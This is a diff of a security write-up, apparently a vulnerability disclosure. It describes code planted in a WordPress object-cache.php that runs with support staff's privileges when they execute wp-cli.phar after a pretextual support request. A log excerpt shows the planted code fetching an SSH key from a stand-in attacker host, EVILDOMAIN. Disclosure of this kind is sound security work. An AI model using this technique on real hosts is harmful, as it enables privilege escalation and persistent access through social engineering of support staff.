@@ -134,7 +134,7 @@ Although the execution of PHP (and so wp-cli.phar) will have no way to execute s
         @curl_close($c);
 ```
 
-If this were inside object-cache.php and we would run this as a supportdesk account we see the following:
+So now we contact customer support and say that we cannot upgrade a plugin. When they execute wp-cli.phar the code in object-cache.php would be executed with their privileges. They would see the following:
 ```
 $ wp-cli.phar plugin list --skip-plugins --skip-themes
 +-------------------------------+----------+--------+---------+
@@ -146,7 +146,9 @@ $ wp-cli.phar plugin list --skip-plugins --skip-themes
 | pace-builder                  | active   | none   | 1.1.6   |
 +-------------------------------+----------+--------+---------+
 ```
+
 So, we see nothing at all, but in the meantime on EVILDOMAIN's webserver we see the following in the logs:
+
 ```
 root@EVILDOMAIN:/var/log/apache2/# tail -f access.log 
 xxx.xx.xxx.xx - - [04/Jul/2017 14:55:55] "GET /sshkey.pub HTTP/1.1" 200 -
